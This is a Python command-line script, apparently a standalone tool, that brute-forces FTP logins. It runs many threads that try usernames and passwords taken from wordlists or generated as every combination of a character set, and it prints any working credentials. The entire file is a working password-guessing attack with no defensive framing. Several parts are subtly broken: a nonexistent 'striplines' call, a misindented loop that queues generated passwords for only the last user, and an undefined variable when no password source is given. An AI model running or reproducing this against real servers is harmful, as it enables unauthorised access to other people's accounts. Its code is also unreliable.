import ftplib
from threading import Thread
import queue
from colorama import init, Fore
import sys
import argparse
import itertools
import string

q = queue.Queue()

def connect_ftp(host, port, q):
    while True:
        user, password = q.get()
        try:
            with ftplib.FTP() as server:
                print(f"[!] Trying: {password}")
                server.connect(host, port, timeout=5)
                server.login(user, password)

                print(f"{Fore.GREEN}[+] Found credentials:")
                print(f"\tHost: {host}")
                print(f"\tUser: {user}")
                print(f"\tPassword: {password}{Fore.RESET}")

                with q.mutex:
                    q.queue.clear()
                    q.all_tasks_done.notify_all()
                    q.unfinished_tasks = 0
        except ftplib.error_perm:
            pass
        except Exception as e:
            print(f"{Fore.RED}[-] Error: {str(e)}")
        finally:
            q.task_done()

def load_lines(file_path):
    with open(file_path, 'r') as file:
        lines = file.read().striplines()
    return lines

def generate_passwords(min_length, max_length, chars):
    for length in range(min_length, max_length + 1):
        for password in itertools.product(chars, repeat=length):
            yield "".join(password)
  

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="FTP Brute Force.")
    parser.add_argument("--host",type=str,required=True, help='FTP server host or IP.')
    parser.add_argument("--port",type=int, default=21, help="FTP server port. Default is 21")
    parser.add_argument("-t","--threads",type=int,default=30,help="number of threads to use.")
    parser.add_argument("-u","--user",type=str,help="A single username.")
    parser.add_argument("-U","--userlist",type=str, help="Path to the usernames list.")
    parser.add_argument("-w","--wordlist",type=str,help="Path to the passwords list.")
    parser.add_argument("-g","--generate",action="store_true",help="Generate passwords on the fly.")
    parser.add_argument("--min_length",type=int,help="minimum length for password generation.",default=1)
    parser.add_argument("--max_length",type=int,help="Maximux length for password generation.",default=1)
    parser.add_argument("-c","--chars",type=str,help="characters to use for password generation.",default=string.ascii_letters+string.digits)

    args = parser.parse_args()
    
    host = args.host
    port = args.port
    n_threads = args.threads

    if not args.user and not args.userlist:
        print("Please provide a single username or a userlist file.")
        sys.exit(1)

    if args.userlist:
        users = load_lines(args.userlist)
    else:
        users = [args.user]

    if args.wordlist:
        passwords = load_lines(args.wordlist)
    elif args.generate:
        passwords = generate_passwords(args.min_length, args.max_length, args.chars)
    else:
        print('Please provide a wordlist file or specify to generate passwords')

    if args.wordlist:
        print(f"[+] Usernames to try: {len(users)}")
        print(f"[+] Passwords to try: {len(passwords)}")
    else:
        print(f"[+] Usernames to try: {len(users)}")
        print(f"[+] Generating passwords on the fly")

    for user in users:
        if args.wordlist:
            for password in passwords:
                q.put((user,password))
    
    else:
        for password in passwords:
            q.put((user,password))
    
    for _ in range(n_threads):
        thread = Thread(target=connect_ftp, args=(host, port, q))
        thread.daemon = True
        thread.start()

    q.join()